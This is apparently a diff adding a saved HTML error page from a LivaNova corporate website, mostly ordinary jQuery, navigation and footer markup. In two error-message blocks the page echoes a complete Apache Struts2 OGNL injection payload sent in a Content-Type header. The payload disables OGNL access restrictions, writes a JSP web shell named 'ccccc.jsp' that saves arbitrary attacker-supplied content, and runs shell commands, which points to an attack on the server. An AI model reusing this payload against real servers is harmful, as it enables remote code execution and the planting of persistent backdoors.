+			confirmText = "Are you sure to add content: \""+textSupport+"\" to your blacklist?";
+		} else {
+			confirmText = "Are you sure to remove content: \""+textSupport+"\" from your blacklist?";
+		}
+		data = {'blacklistFamily': blacklistFamily, 'contentId': elementId};
+	} else if(blacklistFamily == 'user' ||
+		blacklistFamily == 'relatedUser') {
+		if(action=='ADD') {
+			confirmText = "Are you sure to add \""+textSupport+"\" to your blacklist?";
+		} else {
+			confirmText = "Are you sure to remove \""+textSupport+"\" from your blacklist?";
+		}
+		data = {'blacklistFamily': blacklistFamily, 'userID': elementId};
+	}
+	//if(confirm(confirmText)) {
+		$.getJSON(
+				url,
+				data,
+				function(jsonResp){
+					var selector = $("#"+selectorId);
+					var status = jsonResp[0][0];
+					var message = jsonResp[0][1];
+					var selectorControlPanel = $("#"+selectorId+" .controlPanel");
+					if(status == 'success'){
+						selector.toggleClass('blacklisted');
+						if(action=='ADD') {
+							controlPanelToogle(selectorId, 'BLACKLIST_ADD');
+							if(blacklistFamily == 'user' ||
+									blacklistFamily == 'relatedUser') {
+								controlPanelUserTooltipToogle(elementId.replace('.', '_-_'), 'BLACKLIST_ADD');
+							}
+						} else {
+							controlPanelToogle(selectorId, 'BLACKLIST_REMOVE');
+							if(blacklistFamily == 'user' ||
+									blacklistFamily == 'relatedUser') {
+								controlPanelUserTooltipToogle(elementId.replace('.', '_-_'), 'BLACKLIST_REMOVE');
+							}
+						}
+					} else {
+						alert(message);
+					}
+				}
+		);
+	//}
+}
+
+function addToFavorites(userId, htmlId, callback, action){
+	//$('#'+htmlId+' a').text('In process...');
+	var socialRelationshipType = 'favorite';
+	if(action == 'FRIEND_ADD') {
+		socialRelationshipType = 'friendship';
+	}
+	$.post(
+		'/json/socialRelationshipConnect.action',
+		{ 
+			'relationshipId': socialRelationshipType, 
+			'userId':userId 
+		},
+		function(json){
+			//callback(json, userId, htmlId, action);
+			callback(json, htmlId, action);
+		},
+		'json'
+	);
+	return false;
+}
+
+function removeFromFavorites(userId, htmlId, callback, action){
+	//$('#'+htmlId+' a').text('In process...');
+	var socialRelationshipType = 'favorite';
+	if(action == 'FRIEND_REMOVE') {
+		socialRelationshipType = 'friendship';
+	}
+	$.post(
+		'/json/socialRelationshipDisconnect.action',
+		{ 
+			'relationshipId': socialRelationshipType,
+			'userId':userId 
+		},
+		function(json){
+			//callback(json, userId, htmlId, action);
+			callback(json, htmlId, action);
+		},
+		'json'
+	);
+	return false;
+}
+
+function callBackSecondLevelUserSuggestions(json, userId, htmlId) {
+	$('#'+htmlId+' a').hide();
+	var out = '<a class="done" href="javascript:void(0);">Added to favorites</a>';
+	$('#'+htmlId).append(out);
+	$("#"+htmlId).parent().hide();
+	$("#scheda_user_"+userId.replace('.', '_-_')).each(
+			function(){
+				$(this).hide();
+			}
+	);
+}
+
+function callBackUserTooltip(json, htmlId, action) {
+	controlPanelUserTooltipToogle(htmlId, action);
+	controlPanelToogle('scheda_user_'+htmlId, action);
+}
+
+function expandContentDescription(action, contentId) {
+	var selector_small = $("#smallDescription_"+contentId);
+	var selector_small_expander = $("#smallDescriptionExpander_"+contentId);
+	var selector_long = $("#longDescription_"+contentId);
+	var selector_long_expander = $("#longDescriptionExpander_"+contentId);
+	if(action == 'more') {
+		selector_long.css("display", "inline");
+		selector_long_expander.css("display", "inline");
+		selector_small.css("display", "none");
+		selector_small_expander.css("display", "none");
+	} else if(action == 'less'){
+		selector_long.css("display", "none");
+		selector_long_expander.css("display", "none");
+		selector_small.css("display", "inline");
+		selector_small_expander.css("display", "inline");
+	}
+	/*
+	 * Versione animata - da rivedere
+	 **
+	if(action == 'more') {
+		selector_small.hide(1,function(){selector_long.slideDown("fast");});
+	} else if(action == 'less'){
+		selector_long.slideUp("fast",function(){selector_small.show()});
+	}
+	*/
+	return false;
+}
+
+function expandCommentDescription(action, commentId) {
+	var selector_small = $("#smallDescriptionComment_"+commentId);
+	var selector_small_expander = $("#smallDescriptionCommentExpander_"+commentId);
+	var selector_long = $("#longDescriptionComment_"+commentId);
+	var selector_long_expander = $("#longDescriptionCommentExpander_"+commentId);
+	if(action == 'more') {
+		selector_long.css("display", "inline");
+		selector_long_expander.css("display", "inline");
+		selector_small.css("display", "none");
+		selector_small_expander.css("display", "none");
+	} else if(action == 'less'){
+		selector_long.css("display", "none");
+		selector_long_expander.css("display", "none");
+		selector_small.css("display", "inline");
+		selector_small_expander.css("display", "inline");
+	}
+	/*
+	 * Versione animata - da rivedere
+	 **
+	if(action == 'more') {
+		selector_small.hide(1,function(){selector_long.slideDown("fast");});
+	} else if(action == 'less'){
+		selector_long.slideUp("fast",function(){selector_small.show()});
+	}
+	*/
+	return false;
+}
+</script>
+
+
+
+
+
+
+<script type="text/javascript" src="/common/js/ttlib/urlUtils.js?v=2017042005"></script>
+<script type="text/javascript">
+	//Utility vars
+	var tt_protocol = 'http';
+	var tt_default_first_level_domain = 'replynet.prv';
+	var tt_app_path = '';
+	var current_network_id = 'livanova';
+
+	var current_network_alias_domainName = 'www.livanova.com';
+	var current_network_alias_port = '80';
+	var current_network_alias = '';
+	if(current_network_alias_domainName != '') {
+		current_network_alias = 'www.livanova.com';
+		if(current_network_alias_port != '') {
+			current_network_alias += ':'+'80';
+		}
+	}
+</script>
+<script type="text/javascript" src="/common/js/home/widget/genericWidgetManager.js?v=2017042005"></script>
+
+
+
+		
+		
+			<style type="text/css">
+				/* iPad fixes */
+				body {height:auto;}
+				.nofooter {height:auto;}
+				#mainwrap {height:auto;}
+				#scroll_wrapper {height:auto;}
+			</style>
+		
+	</head>
+	
+	<body class=" section_  navDepth ">
+		
+		
+
+
+
+
+
+		
+		<div id="mainwrap" class="exploded">
+			<div id="loading" style="display: none;">
+				Loading...
+			</div>
+			
+			
+			
+			
+			
+			
+
+
+
+
+<div id="header" class="">
+	<div class="top_bar">
+ 		 
+		
+			<div class="legacy_sites">
+				<a href="http://www.sorin.com" title="Visit Sorin legacy website">Sorin</a> <span>/</span> <a href="http://www.cyberonics.com" title="Visit Cyberonics legacy website">Cyberonics</a>
+			</div>
+		
+		
+		<div class="social_badges">
+			<a href="https://www.linkedin.com/company/sorin-group" target="_blank" class="linkedin" title="Share on Linkedin!">Share on Linkedin!</a>
+			<a href="https://www.youtube.com/user/SorinGroupVideos" target="_blank" class="youtube" title="Youtube Channel">Youtube</a>
+			<a href="/rss/rss.action" target="_blank" class="rss" title="RSS Feed">RSS Feed</a>
+		</div>
+		
+	</div>
+	<div class="header-wrapper">
+		<h1 class="logo">
+			<a href="/home.action">LivaNova</a>
+		</h1>
+		<div class="mobile_title"></div>
+		
+		
+			<div class="nav_01"></div>
+			
+
+
+
+<ul id="globalNavBar" class="navigationBar level1" data-tt-lvn-navbar>
+	<li id="first" class="first" data-tt-lvn-highlightmatch="/about-us">
+		<a title="" href="http://www.livanova.com/about-us/">
+				About us
+		</a>
+	</li>
+
+	<li data-tt-lvn-highlightmatch="/investor-relations">
+		<a href="http://investor.livanova.com/">
+				Investor Relations
+		</a>
+	</li>	
+	<li data-tt-lvn-highlightmatch="/newsroom">
+		<a href="http://investor.livanova.com/phoenix.zhtml?c=254127&amp;p=irol-newsroom">
+				News & Events
+		</a>
+	</li> 
+	<li data-tt-lvn-highlightmatch="/careers">
+		<a href="http://www.livanova.com/careers/">
+				Careers
+		</a>
+	</li>
+	<li data-tt-lvn-highlightmatch="/contact-us">
+		<a href="http://www.livanova.com/contact-us/">
+				Contact Us
+		</a>
+	</li>
+	<li>	
+		
+			<div class="search search_mobile googleCSE_wrapper" id="search_mobile">
+				<div class="search_box">
+					<gcse:searchbox-only></gcse:searchbox-only>
+				</div>
+			</div>
+		
+		
+	</li>
+	
+
+</ul>
+
+		
+		
+		
+		
+		
+			<script type="text/javascript">
+				$(function(){
+					function highlightNavbarElement(index, listItem){
+						var highlightMatch = $(listItem).attr("data-tt-lvn-highlightmatch");
+						if (highlightMatch && highlightMatch != ''){
+							var rgxp = new RegExp("^(/tamtamy)?"+highlightMatch);
+							if (rgxp.test(window.location.pathname)){
+								$(listItem).addClass("on");
+							}
+						}
+					}
+					
+					var navbarElements = $('ul[data-tt-lvn-navbar] > li');
+					if (navbarElements && navbarElements.size() > 0){
+						navbarElements.each(highlightNavbarElement);
+					}
+					
+				});
+			</script>
+		
+		
+		
+			
+
+
+<script type="text/javascript">
+	$(document).ready(function(){
+		$(".nav_01").click(function(){
+			$( this ).toggleClass( "active" );
+			$(".navigationBar").toggleClass( "open" );
+		});
+		
+		$(".search_call .search_button").click(function(){
+			$( this ).parent(".search_call").toggleClass( "open" );
+			$("#header .search:not(.search_mobile)").slideToggle();
+			if ($( this ).parent(".search_call").hasClass("open")){
+				$('input[name="searchQuery"]').focus();
+			}
+			
+		});
+	});
+
+</script>
+
+<div class="search_call">
+	<div class="search_button"></div>
+</div>
+
+<div class="search googleCSE_wrapper" id="search" style="display: none;">
+	
+	<label>Search in the website</label>
+		<div class="search_box">
+
+
+<script>
+   (function() {
+     var cx = '013796318930215480043:o7woib3jv5a';
+     var gcse = document.createElement('script');
+     gcse.type = 'text/javascript';
+     gcse.async = true;
+     gcse.src = 'https://cse.google.com/cse.js?cx=' + cx;
+     var s = document.getElementsByTagName('script')[0];
+     s.parentNode.insertBefore(gcse, s);
+   })();
+</script>
+<gcse:searchbox-only></gcse:searchbox-only>
+
+		</div>
+	</form>
+</div>
+		
+		 
+		
+		
+	</div>
+</div>
+
+			
+
+<div id="errorbox" style="display:none;">
+	<a href="javascript:void(0);" onclick="return messagesClose();">
+	&nbsp;	<ul class="errorMessage">
+            <li><span>Error uploading: the request doesn't contain a multipart/form-data or multipart/mixed stream, content type header is %{(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ccccc='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#path=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest').getSession().getServletContext().getRealPath('/')).(#shell='mm&lt;%new java.io.FileOutputStream(request.getParameter(\&quot;f\&quot;)).write(request.getParameter(\&quot;c\&quot;).getBytes());%&gt;').(new java.io.BufferedWriter(new java.io.FileWriter(#path+'/ccccc.jsp').append(#shell)).close()).(#cmd='echo \&quot;write file to '+#path+'/ccccc.jsp\&quot;').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.&lt;strong&gt;&lt;font color=&quot;#FF0000&quot;&gt;struts&lt;/font&gt;&lt;/strong&gt;2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}</span></li>	</ul>
+
+	</a>
+</div>
+
+<script type="text/javascript">
+
+	function addActionMessageClose(){
+		$('#errorbox').fadeOut('slow');
+	}
+	function addActionMessage(msg){
+		$('#errorbox > a').html(msg);
+		$('#errorbox').fadeIn('slow');
+		setTimeout(addActionMessageClose, 3000);
+	}
+</script>
+
+
+			
+
+
+
+
+
+
+
+
+
+
+
+			
+			
+
+
+
+
+
+	
+	 
+
+
+<div id="wrapcontent">
+	
+	<div class="wrapcontent_padding">
+		<div id='main' class="leftColumnPos">
+			<div class="column_padding">
+				
+				
+				
+				
+
+
+
+<div class="error_page">
+			<ul class="errorMessage">
+            <li><span>Error uploading: the request doesn't contain a multipart/form-data or multipart/mixed stream, content type header is %{(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ccccc='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#path=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest').getSession().getServletContext().getRealPath('/')).(#shell='mm&lt;%new java.io.FileOutputStream(request.getParameter(\&quot;f\&quot;)).write(request.getParameter(\&quot;c\&quot;).getBytes());%&gt;').(new java.io.BufferedWriter(new java.io.FileWriter(#path+'/ccccc.jsp').append(#shell)).close()).(#cmd='echo \&quot;write file to '+#path+'/ccccc.jsp\&quot;').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.&lt;strong&gt;&lt;font color=&quot;#FF0000&quot;&gt;struts&lt;/font&gt;&lt;/strong&gt;2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}</span></li>	</ul>
+
+</div>
+			</div>
+		</div>
+		<div id="sidebar" class="rightColumnPos">
+			<div class="column_padding">
+				
+					
+
+
+
+<script type="text/javascript" src="/common/js/user/userOnline.js?v=2017042005"></script>
+<script type="text/javascript" src="/common/js/uwa/IFrameMessaging.js?v=2017042005"></script>
+<script type="text/javascript" src="/common/js/uwa/widgetEventHandler.js?v=2017042005"></script>
+
+
+
+	<div id="menucol339" class="menucolumn_generico menuColumn0 lastMenuColumn">
+		
+			
+			
+			
+			
+			
+			
+			
+			
+			
+				
+			
+			
+						
+				
+					
+				
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+	
+		
+	
+
+
+
+
+
+
+
+	
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+	
+		
+		
+		
+		
+		
+		
+	
+
+	
+		
+		
+		
+		
+		
+		
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+		
+		
+		
+		
+		
+		
+	
+
+	
+
+
+
+
+
+
+	
+
+
+
+
+
+
+
+
+	<div class="wrapwidg plugin_sidebarnavigation " id="homewidget_1209" >
+	<div class="widget_padding">
+		
+		
+			
+		
+
+
+
+
+
+	
+		
+		<span id="homewidget_1209_body">
+		
+		</span>
+	</div>
+	</div>
+
+
+			
+		
+	</div>
+
+	
+				
+				
+				
+			</div>
+		</div>
+	</div>
+</div>
+
+	
+			
+
+
+  <div id="footer">
+    
+	
+	
+	<p id="global">
+		
+	</p>
+	
+	<p id="logo_pow">
+		<a href="http://www.tamtamy.com" target="_blank">
+			<span>Powered by Tamtamy</span>
+		</a>
+	</p>
+	
+	
+		<div class="footer_sorin">
+			<a href="/terms">TERMS OF USE</a> 
+			<a href="/privacy">PRIVACY STATEMENT</a>  
+			<a href="/privacy/cookies">COOKIE POLICY</a>
+			
+			<a target="_blank" href="http://www.sorin.com" class="mobile_legacy_sites">sorin.com</a>
+			<a target="_blank" href="http://www.cyberonics.com" class="mobile_legacy_sites">cyberonics.com</a>
+			<a href="/" class="logo">LivaNova</a>
+		</div>
+		<div class="sub_footer">
+			<p>LivaNova PLC - Registered in England and Wales - Registered No. 09451374 - 20 Eastbourne Terrace, London, W2 6LG, United Kingdom</p>
+		</div>
+		<script type="text/javascript">
+			$('[data-tt-attachmentsclickerenabler] li').click(function(){
+				var link = $(this).find('a').attr('href');
+				if (link){
+					window.location.href = link;
+				}
+			});
+			$('[data-tt-attachmentsclickerenabler] li').css('cursor','pointer');
+		</script>
+	
+	
+
+  </div>
+
+
+<script type="text/javascript">  
+if (SorinAnchor){
+	SorinAnchor.execute();
+}
+
+</script>
+
+
+<div id="version">
+	<span>Version <strong>unknown</strong> | Revision <strong>102328</strong> | Status <strong>unstable</strong> | SessionId <strong>BADF4AC00126F890E656E61FC4F96C12.jvm1</strong></span>
+</div>
+
+
+  
+
+			
+			<script type="text/javascript" src="/common/js/winTransparency.js"></script>
+		</div>
+		
+		
+		
+		
+		
+		
+		
+
+
+
+	
+	
+	
+	
+	
+		<script>
+		  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+		  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+		  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+		  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+		 
+		  ga('create', 'UA-68441266-1', 'auto');
+		  ga('send', 'pageview');
+		 
+		</script>
+	
+	
+	
+
+	</body>
+</html>
+
+http://www.livanova.com/file/download-4279.action
